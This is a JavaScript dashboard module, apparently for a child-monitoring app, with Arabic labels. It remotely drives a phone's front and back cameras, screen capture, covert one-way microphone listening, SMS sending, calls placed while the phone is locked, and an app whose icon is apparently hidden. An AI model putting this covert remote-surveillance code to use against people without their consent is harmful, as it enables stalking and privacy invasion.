import { h, fmtDateTime, emptyState } from "../util.js";

/**
 * قسم "مباشر": كاميرات أمامية/خلفية بمربعات تحديد، شاشة، مايك أحادي الاتجاه،
 * تسجيل لحظي، إرسال رسالة، اتصال (مع اختيار الشريحة)، لقطة شاشة.
 * يعتمد على مجموعة live/{front,back,screen,mic} في Firestore.
 */
export function render(container, ctx) {
  container.innerHTML = "";
  const root = h("div", { class: "live-section" });
  container.append(root);

  const storeKey = `kids.live.${ctx.deviceId}`;
  const saved = readState(storeKey);

  // ---------- بث مباشر WebRTC ----------
  root.append(sectionTitle("🔴", "بث مباشر (فيديو + صوت)", "اتصال WebRTC حقيقي بين الجهاز واللوحة — يفتح كاميرا وميكروفون الجهاز أثناء البث"));
  const video = h("video", { class: "live-video", autoplay: true, playsinline: true, controls: true });
  const rtcStatus = h("div", { class: "muted small", text: "يتطلب صلاحية الكاميرا والميكروفون + «الظهور فوق التطبيقات» على الجهاز." });
  const rtcStart = h("button", { class: "btn primary sm", type: "button", text: "▶ بدء البث المباشر" });
  const rtcStop = h("button", { class: "btn ghost sm", type: "button", text: "⏹ إيقاف البث", disabled: true });
  root.append(h("div", { class: "card live-card" }, [
    video,
    rtcStatus,
    h("div", { class: "actions-row" }, [rtcStart, rtcStop]),
    h("div", { class: "muted small", text: "إذا فشل الاتصال المباشر استخدم كاميرا الصور بالأسفل (شبه لحظية) كبديل." }),
  ]));

  // ---------- الكاميرات ----------
  root.append(sectionTitle("🎥", "الكاميرات", "حدّد المربع لتشغيل الكاميرا، وألغِه للإيقاف (صورة كل ثانيتين)"));
  const cams = h("div", { class: "live-grid" });
  const front = cameraCard("front", "الكاميرا الأمامية", ctx, saved, storeKey);
  const back = cameraCard("back", "الكاميرا الخلفية", ctx, saved, storeKey);
  cams.append(front.card, back.card);
  root.append(cams);
  root.append(h("div", { class: "actions-row" }, [
    actionButton("⏹️", "إيقاف الكاميرتين", () => send("camera_stop", {}, ctx)),
  ]));

  // ---------- الشاشة ----------
  root.append(sectionTitle("🖥️", "الشاشة", "صورة محدثة كل 3 ثوانٍ بعد الموافقة على الجهاز مرة لكل جلسة"));
  const screenImg = h("img", { class: "live-frame", alt: "الشاشة" });
  screenImg.style.display = "none";
  const screenInfo = h("div", { class: "muted small", text: "لا توجد لقطة بعد" });
  const screenBadge = h("span", { class: "live-badge hidden", text: "قديمة" });
  const screenFull = h("button", { class: "btn ghost sm", type: "button", text: "⛶ تكبير", disabled: true });
  screenFull.addEventListener("click", () => {
    if (screenImg.src) openLiveFullscreen(screenImg.src, "شاشة الجهاز");
  });
  const screenCard = h("div", { class: "card live-card" }, [
    h("div", { class: "live-head" }, [h("span", { class: "live-dot" }), h("strong", { text: "شاشة الجهاز" }), screenBadge]),
    screenImg,
    screenInfo,
    h("div", { class: "actions-row" }, [
      actionButton("📸", "لقطة الآن", () => send("take_screenshot", {}, ctx)),
      actionButton("🔄", "فحص الحالة", () => send("screen_status", {}, ctx)),
      actionButton("⏹️", "إيقاف المشاركة", () => send("screen_stop", {}, ctx)),
      screenFull,
    ]),
    h("div", { class: "muted small", text: "بث شبه لحظي: لقطة كل 1.5 ثانية. لبدء البث: افتح التطبيق ← «مشاركة الشاشة» ← موافق مرة واحدة. اللقطات المحفوظة في قسم الوسائط مع زر حذف." }),
  ]);
  root.append(screenCard);

  // ---------- المايك ----------
  root.append(sectionTitle("🎙️", "المايك", "استماع أحادي متتابع: تسمع ما حول الجهاز، والجهاز لا يسمعك"));
  const micBox = h("input", { type: "checkbox" });
  micBox.checked = !!saved.mic;
  const micStatus = h("div", { class: "muted small", text: micBox.checked ? "المايك مفتوح" : "المايك مغلق" });
  const audio = h("audio", { controls: true, class: "audio-player" });
  const micList = h("div", { class: "audio-queue" });
  const micCard = h("div", { class: "card live-card" }, [
    h("label", { class: "live-check" }, [micBox, h("strong", { text: "فتح مايك الجهاز (استماع فقط)" })]),
    micStatus,
    audio,
    h("div", { class: "muted small", text: "مقاطع 3 ثوانٍ تُشغّل تلقائياً بالترتيب = بث شبه لحظي." }),
    h("div", { class: "actions-row" }, [
      actionButton("⏺️", "تسجيل لحظي (30 ث)", () => send("record_mic", {}, ctx)),
    ]),
    micList,
  ]);
  root.append(micCard);

  micBox.addEventListener("change", () => {
    saved.mic = micBox.checked;
    writeState(storeKey, saved);
    micStatus.textContent = micBox.checked ? "جارٍ فتح المايك…" : "جارٍ الإغلاق…";
    send(micBox.checked ? "mic_start" : "mic_stop", {}, ctx);
  });

  // ---------- منطق WebRTC ----------
  let rtcPc = null;
  let rtcSession = null;
  let rtcMic = null;
  let rtcAnswered = false;
  let childSeen = 0;

  function rtcReset() {
    try { rtcPc?.close(); } catch { /* تجاهل */ }
    rtcPc = null;
    try { rtcMic?.getTracks().forEach((t) => t.stop()); } catch { /* تجاهل */ }
    rtcMic = null;
    rtcSession = null;
    rtcAnswered = false;
    childSeen = 0;
    try { video.srcObject = null; } catch { /* تجاهل */ }
    rtcStart.disabled = false;
    rtcStop.disabled = true;
  }

  async function ensureRtcPc() {
    if (rtcPc) return rtcPc;
    rtcPc = new RTCPeerConnection({
      iceServers: [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" },
        { urls: "turn:openrelay.metered.ca:80", username: "openrelayproject", credential: "openrelayproject" },
        { urls: "turn:openrelay.metered.ca:443", username: "openrelayproject", credential: "openrelayproject" },
      ],
    });
    rtcPc.ontrack = (e) => {
      const stream = e.streams?.[0] || new MediaStream([e.track]);
      video.srcObject = stream;
      video.play().catch(() => {});
      rtcStatus.textContent = "🟢 بث مباشر يعمل";
    };
    rtcPc.onicecandidate = (e) => {
      if (!e.candidate || !rtcSession || !ctx.data.addRtcCandidate) return;
      ctx.data.addRtcCandidate(ctx.uid, ctx.deviceId, "parentCandidates", {
        s: rtcSession,
        sdpMid: e.candidate.sdpMid,
        sdpMLineIndex: e.candidate.sdpMLineIndex,
        candidate: e.candidate.candidate,
      });
    };
    rtcPc.onconnectionstatechange = () => {
      const st = rtcPc?.connectionState || "";
      if (st === "connected") rtcStatus.textContent = "🟢 متصل — بث مباشر";
      else if (st === "failed") rtcStatus.textContent = "تعذر الاتصال المباشر (جرّب إعادة المحاولة)";
      else if (st) rtcStatus.textContent = "حالة الاتصال: " + st;
    };
    try {
      rtcMic = await navigator.mediaDevices.getUserMedia({ audio: true });
      rtcMic.getAudioTracks().forEach((t) => rtcPc.addTrack(t, rtcMic));
    } catch {
      rtcMic = null;
    }
    return rtcPc;
  }

  async function startRtc() {
    if (!ctx.data.setRtc || !window.RTCPeerConnection) {
      rtcStatus.textContent = "البث المباشر غير متاح في هذا المتصفح/الوضع";
      return;
    }
    rtcReset();
    rtcSession = "s" + Date.now();
    rtcStart.disabled = true;
    rtcStop.disabled = false;
    rtcStatus.textContent = "جارٍ طلب البث من الجهاز…";
    await ctx.data.setRtc(ctx.uid, ctx.deviceId, {
      request: true,
      session: rtcSession,
      status: "requested",
      parentCandidates: [],
      childCandidates: [],
      answer: null,
    });
  }

  async function stopRtc() {
    const sess = rtcSession;
    if (ctx.data.setRtc && sess) {
      await ctx.data.setRtc(ctx.uid, ctx.deviceId, { request: false, session: sess, status: "stopped" });
    }
    if (ctx.data.sendCommand) ctx.data.sendCommand(ctx.uid, ctx.deviceId, "rtc_stop", {});
    rtcReset();
    rtcStatus.textContent = "تم إيقاف البث";
  }

  async function applyRtc(rtc) {
    if (!rtc) return;
    if (!rtcSession && rtc.offer?.s && rtc.status !== "stopped") {
      rtcSession = rtc.offer.s;
      rtcStart.disabled = true;
      rtcStop.disabled = false;
    }
    if (!rtcSession) return;
    if (rtc.session && rtc.session !== rtcSession) return;
    if (rtc.status === "stopped") {
      rtcReset();
      rtcStatus.textContent = "تم إيقاف البث من الجهاز";
      return;
    }
    if (rtc.status === "error" && rtc.error) {
      rtcStatus.textContent = "خطأ على الجهاز: " + rtc.error;
      return;
    }
    const offer = rtc.offer;
    if (offer?.sdp && offer.s === rtcSession && !rtcAnswered) {
      rtcAnswered = true;
      rtcStatus.textContent = "جارٍ تبادل الاتصال…";
      try {
        const pc = await ensureRtcPc();
        await pc.setRemoteDescription({ type: "offer", sdp: offer.sdp });
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);
        await ctx.data.setRtc(ctx.uid, ctx.deviceId, {
          answer: { type: "answer", sdp: answer.sdp, s: rtcSession },
          status: "answered",
        });
      } catch (e) {
        rtcAnswered = false;
        rtcStatus.textContent = "فشل الاتصال: " + (e?.message || e);
      }
    }
    if (rtcPc && Array.isArray(rtc.childCandidates)) {
      const list = rtc.childCandidates.filter((c) => c && c.s === rtcSession);
      while (childSeen < list.length) {
        const c = list[childSeen];
        childSeen++;
        try {
          await rtcPc.addIceCandidate(new RTCIceCandidate({
            candidate: c.candidate,
            sdpMid: c.sdpMid,
            sdpMLineIndex: c.sdpMLineIndex,
          }));
        } catch { /* تجاهل */ }
      }
    }
    if (rtc.iceState === "CONNECTED" || rtc.iceState === "COMPLETED") {
      rtcStatus.textContent = "🟢 بث مباشر يعمل";
    }
  }

  rtcStart.addEventListener("click", startRtc);
  rtcStop.addEventListener("click", stopRtc);

  // ---------- أوامر سريعة ----------
  root.append(sectionTitle("⚡", "أوامر سريعة"));
  const actions = h("div", { class: "actions-row" }, [
    actionButton("📞", "إجراء مكالمة", () => openCallModal(ctx)),
    actionButton("✉️", "إرسال رسالة", () => promptCommand(ctx, {
      title: "إرسال رسالة",
      fields: [
        { name: "number", label: "رقم المستلم", placeholder: "05xxxxxxxx", required: true },
        { name: "message", label: "نص الرسالة", required: true },
      ],
      type: "send_message",
      okText: "إرسال",
    })),
    actionButton("📷", "صورة من الجهاز", () => send("take_photo", {}, ctx)),
    actionButton("🔔", "رنين الجهاز", () => send("ring", {}, ctx)),
    actionButton("🔒", "قفل الجهاز", () => send("lock", {}, ctx)),
    actionButton("💡", "إيقاظ الشاشة", () => send("wake", {}, ctx)),
    actionButton("🔄", "مزامنة الآن", () => send("sync_now", {}, ctx)),
    actionButton("🪪", "إظهار أيقونة التطبيق", () => send("show_app", {}, ctx)),
    actionButton("🗑", "إزالة التطبيق", () => removeApp(ctx)),
  ]);
  root.append(actions);

  // ---------- اشتراك live ----------
  const unsubLive = ctx.data.subscribeLive(ctx.uid, ctx.deviceId, (data, err) => {
    if (err) {
      screenInfo.textContent = "تعذر قراءة بيانات البث (تحقق من الصلاحيات)";
      return;
    }
    const live = data || {};
    front.setFrame(live.front);
    back.setFrame(live.back);
    applyScreen(live.screen);
    applyMic(live.mic);
    applyRtc(live.rtc);
  });

  // ---------- تسجيلات المايك المحفوظة ----------
  const unsubMedia = ctx.data.subscribeCollection(ctx.uid, ctx.deviceId, "media", (items, err) => {
    micList.innerHTML = "";
    if (err || !items) return;
    const clips = items
      .filter((m) => m && (m.mic === true || m.recording === "saved") && (m.url || m.dataUrl))
      .slice(0, 8);
    if (!clips.length) {
      micList.append(h("div", { class: "muted small", text: "لا توجد تسجيلات محفوظة بعد." }));
      return;
    }
    for (const clip of clips) {
      const del = h("button", { class: "icon-btn danger", type: "button", title: "حذف التسجيل", text: "🗑" });
      del.addEventListener("click", async () => {
        try {
          if (ctx.data.deleteMediaItem) await ctx.data.deleteMediaItem(ctx.uid, ctx.deviceId, clip);
          ctx.toast("تم حذف التسجيل");
        } catch { ctx.toast("تعذر الحذف", "error"); }
      });
      micList.append(h("div", { class: "clip-row" }, [
        h("div", { class: "clip-head" }, [
          h("div", { class: "clip-name", text: clip.name || "تسجيل" }),
          del,
        ]),
        h("audio", { controls: true, preload: "none", src: clip.url || clip.dataUrl }),
        h("div", { class: "muted small", text: fmtDateTime(clip.timestamp) }),
      ]));
    }
  });

  // ---------- طابور تشغيل المايك ----------
  const queue = [];
  let playing = false;
  let lastMicTs = 0;

  function applyMic(mic) {
    if (!mic) return;
    const ts = Number(mic.updatedAt || mic.timestamp) || 0;
    if (ts <= lastMicTs) return;
    lastMicTs = ts;
    const src = mic.url || mic.dataUrl;
    if (!src) {
      if (mic.error) micStatus.textContent = "خطأ: " + mic.error;
      return;
    }
    queue.push(src);
    if (queue.length > 12) queue.shift();
    if (!playing) playNext();
  }

  function playNext() {
    const src = queue.shift();
    if (!src) {
      playing = false;
      return;
    }
    playing = true;
    audio.src = src;
    audio.play().catch(() => {
      micStatus.textContent = "اضغط تشغيل على المشغّل مرة واحدة لبدء الصوت";
      playing = false;
    });
  }

  audio.addEventListener("ended", () => { playing = false; playNext(); });
  audio.addEventListener("error", () => { playing = false; playNext(); });

  function applyScreen(screen) {
    if (!screen) return;
    const src = screen.url || screen.dataUrl;
    if (src && src !== screenImg.src) screenImg.src = src;
    screenImg.style.display = src ? "block" : "none";
    screenFull.disabled = !src;
    const age = frameAgeMs(screen);
    const stale = src && age > 30_000;
    screenBadge.classList.toggle("hidden", !stale);
    screenImg.classList.toggle("stale", stale);
    if (screen.error) {
      screenInfo.textContent = "خطأ: " + screen.error;
    } else if (src) {
      screenInfo.textContent = stale
        ? `آخر لقطة ${ageText(age)} — البث متوقف أو الشاشة مقفلة`
        : "مباشر · آخر تحديث " + ageText(age);
    }
  }

  return () => {
    try { unsubLive(); } catch { /* تجاهل */ }
    try { unsubMedia(); } catch { /* تجاهل */ }
    try { audio.pause(); } catch { /* تجاهل */ }
    rtcReset();
  };
}

// ---------- مساعدات ----------

function sectionTitle(icon, title, hint) {
  return h("div", { class: "section-head" }, [
    h("span", { class: "section-icon", text: icon }),
    h("div", {}, [
      h("h3", { class: "panel-title", text: title }),
      hint ? h("div", { class: "muted small", text: hint }) : null,
    ]),
  ]);
}

function cameraCard(kind, label, ctx, saved, storeKey) {
  const box = h("input", { type: "checkbox" });
  box.checked = !!saved[kind];
  const img = h("img", { class: "live-frame", alt: label });
  img.style.display = "none";
  const info = h("div", { class: "muted small", text: box.checked ? "جارٍ التشغيل…" : "الكاميرا متوقفة" });
  const badge = h("span", { class: "live-badge hidden", text: "قديمة" });
  const full = h("button", { class: "btn ghost sm", type: "button", text: "⛶ تكبير", disabled: true });
  full.addEventListener("click", () => {
    const src = img.src;
    if (src) openLiveFullscreen(src, label);
  });
  const card = h("div", { class: "card live-card" }, [
    h("label", { class: "live-check" }, [box, h("strong", { text: label })]),
    h("div", { class: "live-frame-wrap" }, [img, badge]),
    info,
    h("div", { class: "actions-row" }, [full]),
  ]);
  box.addEventListener("change", () => {
    saved[kind] = box.checked;
    writeState(storeKey, saved);
    info.textContent = box.checked ? "جارٍ التشغيل…" : "جارٍ الإيقاف…";
    send(box.checked ? "camera_start" : "camera_stop", { facing: kind }, ctx);
  });
  return {
    card,
    setFrame(data) {
      if (!data) return;
      const src = data.url || data.dataUrl;
      if (src && src !== img.src) img.src = src;
      img.style.display = src ? "block" : "none";
      full.disabled = !src;
      const age = frameAgeMs(data);
      const stale = src && age > 15_000;
      badge.classList.toggle("hidden", !stale);
      img.classList.toggle("stale", stale);
      if (data.error) info.textContent = "خطأ: " + data.error;
      else if (src) {
        info.textContent = stale
          ? `آخر صورة ${ageText(age)} — الكاميرا متوقفة (افتح التطبيق وأعد التشغيل)`
          : "مباشر · " + ageText(age);
      }
    },
  };
}

/** فتح صورة البث في وضع ملء الشاشة. */
function openLiveFullscreen(src, title) {
  const overlay = h("div", { class: "viewer-overlay" });
  const closeBtn = h("button", { class: "btn ghost sm", type: "button", text: "✕ إغلاق" });
  const img = h("img", { class: "viewer-media", src, alt: title || "بث" });
  overlay.append(
    h("div", { class: "viewer-head" }, [h("div", { class: "viewer-title", text: title || "بث مباشر" }), closeBtn]),
    h("div", { class: "viewer-stage" }, [img]),
    h("div", { class: "viewer-bar" }, [
      h("a", { class: "btn primary sm", href: src, target: "_blank", rel: "noopener", download: "live.jpg", text: "⬇ تنزيل اللقطة" }),
    ]),
  );
  const close = () => {
    overlay.remove();
    document.removeEventListener("keydown", onKey);
  };
  const onKey = (e) => { if (e.key === "Escape") close(); };
  closeBtn.addEventListener("click", close);
  overlay.addEventListener("click", (e) => { if (e.target === overlay) close(); });
  document.addEventListener("keydown", onKey);
  document.body.append(overlay);
}

function frameAgeMs(data) {
  if (!data) return Infinity;
  const raw = data.updatedAt || data.timestamp;
  if (raw === null || raw === undefined) return Infinity;
  const ms = typeof raw === "number" ? raw : Date.parse(raw);
  return isFinite(ms) ? Math.max(0, Date.now() - ms) : Infinity;
}

function ageText(ms) {
  if (!isFinite(ms)) return "الآن";
  const s = Math.round(ms / 1000);
  if (s < 5) return "الآن";
  if (s < 60) return `قبل ${s} ثانية`;
  const m = Math.round(s / 60);
  return m < 60 ? `قبل ${m} دقيقة` : `قبل ${Math.round(m / 60)} ساعة`;
}

function actionButton(icon, label, onClick) {
  const btn = h("button", { class: "action-btn", type: "button" }, [
    h("span", { text: icon }),
    h("span", { text: label }),
  ]);
  btn.addEventListener("click", onClick);
  return btn;
}

/** نافذة اتصال مع اختيار الشريحة (dual SIM). */
async function openCallModal(ctx) {
  let sims = [];
  try {
    const dev = ctx.data.getDeviceOnce ? await ctx.data.getDeviceOnce(ctx.uid, ctx.deviceId) : null;
    sims = dev?.raw?.sims || dev?.sims || [];
  } catch { sims = []; }

  const overlay = h("div", { class: "modal-overlay show" });
  const card = h("div", { class: "modal-card" });
  const num = h("input", { class: "input", type: "tel", placeholder: "05xxxxxxxx", dir: "ltr", inputmode: "tel" });
  const sel = h("select", { class: "input select" });
  sel.append(h("option", { value: "", text: sims.length ? "الشريحة الافتراضية" : "لا توجد شرائح معروفة (سيستخدم الافتراضي)" }));
  sims.forEach((s, i) => {
    sel.append(h("option", { value: String(s.index ?? i), text: s.label || `SIM ${i + 1}` }));
  });
  const okBtn = h("button", { class: "btn primary", type: "button", text: "اتصال" });
  const cancel = h("button", { class: "btn ghost", type: "button", text: "إلغاء" });

  card.append(
    h("h3", { text: "إجراء مكالمة" }),
    h("div", { class: "muted small", text: "المكالمة تُنفَّذ من الجهاز حتى لو كانت الشاشة مقفلة." }),
    h("label", { class: "field" }, [h("span", { text: "رقم الهاتف" }), num]),
    h("label", { class: "field" }, [h("span", { text: "خط الاتصال" }), sel]),
    h("div", { class: "modal-actions" }, [okBtn, cancel]),
  );
  overlay.append(card);

  const close = () => overlay.remove();
  cancel.addEventListener("click", close);
  overlay.addEventListener("click", (e) => { if (e.target === overlay) close(); });
  okBtn.addEventListener("click", () => {
    const number = num.value.trim();
    if (!number) { num.focus(); return; }
    const payload = { number };
    if (sel.value !== "") payload.simIndex = Number(sel.value);
    close();
    send("make_call", payload, ctx);
  });

  document.body.append(overlay);
  num.focus();
}

async function promptCommand(ctx, { title, fields, type, okText }) {
  const values = await ctx.modal({ title, fields, okText });
  if (!values) return;
  send(type, values, ctx);
}

/** فتح شاشة إزالة التطبيق على الجهاز (يتطلب تأكيداً على الهاتف). */
async function removeApp(ctx) {
  const ok = await ctx.modal({
    title: "إزالة التطبيق",
    message: "سيُفتح على الجهاز تأكيد إزالة التطبيق. هل تريد المتابعة؟ (الأفضل إظهار الأيقونة أولاً ثم إزالة التطبيق).",
    okText: "متابعة",
    danger: true,
  });
  if (!ok) return;
  send("uninstall_app", {}, ctx);
}

function send(type, payload, ctx) {
  ctx.data
    .sendCommand(ctx.uid, ctx.deviceId, type, payload)
    .then(() => ctx.toast("تم إرسال الأمر"))
    .catch(() => ctx.toast("تعذر إرسال الأمر", "error"));
}

function readState(key) {
  try { return JSON.parse(localStorage.getItem(key) || "{}") || {}; } catch { return {}; }
}

function writeState(key, value) {
  try { localStorage.setItem(key, JSON.stringify(value)); } catch { /* تجاهل */ }
}
